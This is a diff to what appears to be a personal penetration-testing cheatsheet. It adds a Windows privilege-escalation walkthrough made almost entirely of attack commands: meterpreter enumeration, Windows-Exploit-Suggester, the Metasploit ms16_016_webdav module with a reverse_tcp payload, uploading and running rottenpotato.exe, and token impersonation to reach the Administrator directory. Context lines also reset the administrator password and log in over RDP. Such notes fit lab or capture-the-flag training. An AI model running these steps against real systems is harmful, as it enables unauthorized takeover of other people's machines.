@@ -166,3 +166,49 @@ useful cheatsheets https://pentestwiki.org/msfvenom-payloads-cheat-sheet/
 > C:\\Windows\system32>net user administrator password
 > open new terminal
 > xfreerdp target_machine_ip (give user and password)
+
+
+
+
+--Windows priviege escaation--
+
+> Hack into a windows
+> meterpreter> sysinfo
+> meterpreter> getuid
+> meterpreter> getprivs (to get enabled process privileges)
+> meterpreter> shell
+> cd c:\\
+> dir
+> net user
+> whoami /priv
+> whoami /groups
+> hostname
+> tasklist
+> system info (copy all the output and save as sysinfo txt file)
+> open new terminal
+> git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git
+> cd Windows-Exploit-Suggester 
+> ./windows-exploit-suggester.py --update (useful links for any error : https://www.youtube.com/watch?v=ucmHu_bQWik | https://github.com/AonCyberLabs/Windows-Exploit-Suggester/issues/43 | https://stackoverflow.com/questions/65254535/xlrd-biffh-xlrderror-excel-xlsx-file-not-supported)
+> /usr/bin/python2 ./windows-exploit-suggester.py --database 2022-01-25-mssb.xls --systeminfo sysinfo 
+> check, get to know and gather knowledge about the vulnerabilities then get back to shell terminal
+> exit
+> meterpreter> background
+> exit
+> use windows/local/ms16_016_webdav
+> set payload windows/meterpreter/reverse_tcp
+> set lport 1234 (make sure its not the port on which session 1 meterpreter is running)
+> set SESSION 1
+> exploit
+> or
+> search for MS16-075 after windows-exploit-suggester and go to its github link and download the .exe file get back to shell terminal
+> upload ~/Downloads/rottenpotato.exe
+> .\rottenpotato.exe
+> ctrl + c and y
+> load incognito
+> list_tokens -u (copy the impersonate token available)
+> impersonate_token "paste here"
+> getuid (you notice its changed)
+> cd c:\\
+> cd Users
+> cd Administrator
+> 
